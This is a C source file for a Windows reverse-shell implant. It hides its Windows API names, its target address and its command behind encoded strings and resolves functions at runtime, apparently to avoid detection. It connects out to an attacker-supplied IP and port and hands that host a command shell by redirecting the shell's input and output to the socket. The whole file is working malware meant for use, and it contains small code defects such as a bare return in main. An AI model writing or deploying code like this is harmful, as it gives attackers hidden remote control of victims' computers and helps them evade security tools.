#include "../addresshunter.h"
#include "../encryption/enc.h"
#include <winsock2.h>
#include <windows.h>


typedef int (WINAPI* WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET (WINAPI* WSASOCKET)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef struct hostent* (WINAPI* GETHOSTBYNAME)(const char*);
typedef char* (WINAPI* INET_NTOA)(struct in_addr);
typedef unsigned long (WINAPI* INET_ADDR)(const char*);
typedef int (WINAPI* WSACONNECT)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
typedef BOOL (WINAPI* CREATEPROCESS)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR);
typedef FARPROC (WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef u_short (WINAPI* HTONS)(u_short);
typedef char* (__cdecl* STRCPY)(char*, const char*);
typedef int (__cdecl* ATOI)(const char*);
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct in_addr IN_ADDR;



int main() {
    // Get kernel32 base
    UINT64 kernel32 = GetKernel32();
    char* ip_addr = D("enpjbHl9e39zZnl2"); // Insert here your ip address output
    char* port   = D("f3dldg==");
    char* htons_c = D("Izc+LDs=");
    // Load GetProcAddress and LoadLibraryA dynamically
    char* loadlib_c  = D("BywwJgQiISMjOjIC");
    char* getproc_c  = D("DCYlEjokIBAmLDkmIjE=");
    char* msvcrt_c = D("JjAnITo/bTUuJA=="); // msvcrt.dll
    char* strcpy_c = D("ODcjITgy");
    char* atoi_c   = D("Kjc+Kw==");

    GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)GetSymbolAddress((HANDLE)kernel32, getproc_c);
    LOADLIBRARYA   pLoadLibraryA   = (LOADLIBRARYA)GetSymbolAddress((HANDLE)kernel32, loadlib_c);

    // Load ws2_32.dll dynamically
    char* ws2_dll = D("PDBjHXt5bTUuJA==");
    HMODULE ws2_32 = pLoadLibraryA(ws2_dll);

    // Resolve networking functions dynamically
    char* wsastartup_c = D("HBAQETwqMSU3OA==");
    char* wsasocket_c  = D("HBAQEScoKDQ2CQ==");
    char* gethost_c    = D("LCYlKic4ISgsKSYm");
    char* inetntoa_c   = D("Ii00NhclNz4j");
    char* inetaddr_c   = D("Ii00NhcqJzUw");
    char* wsaconnect_c = D("HBAQASclLTQhPA==");
    char* createproc_c = D("CDE0IzwuEyMtKy4wIgM=2");

    WSASTARTUP     pWSAStartup    = (WSASTARTUP)pGetProcAddress(ws2_32, wsastartup_c);
    WSASOCKET      pWSASocket     = (WSASOCKET)pGetProcAddress(ws2_32, wsasocket_c);
    GETHOSTBYNAME  pGetHostByName = (GETHOSTBYNAME)pGetProcAddress(ws2_32, gethost_c);
    INET_NTOA      pInetNtoa      = (INET_NTOA)pGetProcAddress(ws2_32, inetntoa_c);
    INET_ADDR      pInetAddr      = (INET_ADDR)pGetProcAddress(ws2_32, inetaddr_c);
    WSACONNECT     pWSAConnect    = (WSACONNECT)pGetProcAddress(ws2_32, wsaconnect_c);
    CREATEPROCESS  pCreateProcess = (CREATEPROCESS)pGetProcAddress((HMODULE)kernel32, createproc_c);

    // Winsock init
    WSADATA wsaData;
    pWSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET Winsock = pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    HMODULE msvcrt = pLoadLibraryA(msvcrt_c);

    STRCPY pStrcpy = (STRCPY)pGetProcAddress(msvcrt, strcpy_c);
    ATOI   pAtoi   = (ATOI)pGetProcAddress(msvcrt, atoi_c);

    struct hostent* host = pGetHostByName(ip_addr);
    if (!host) return  ;
    pStrcpy(ip_addr, pInetNtoa(*((IN_ADDR*)host->h_addr)));

    HTONS pHtons = (HTONS)pGetProcAddress(ws2_32, htons_c);

    SOCKADDR_IN hax;
    hax.sin_family = AF_INET;
    hax.sin_port = pHtons(pAtoi(port));
    hax.sin_addr.s_addr = pInetAddr(ip_addr);

    pWSAConnect(Winsock, (struct sockaddr*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Winsock;

    char* cmd = D("KC41bC0zJg==");
    pCreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    return 0;

}
   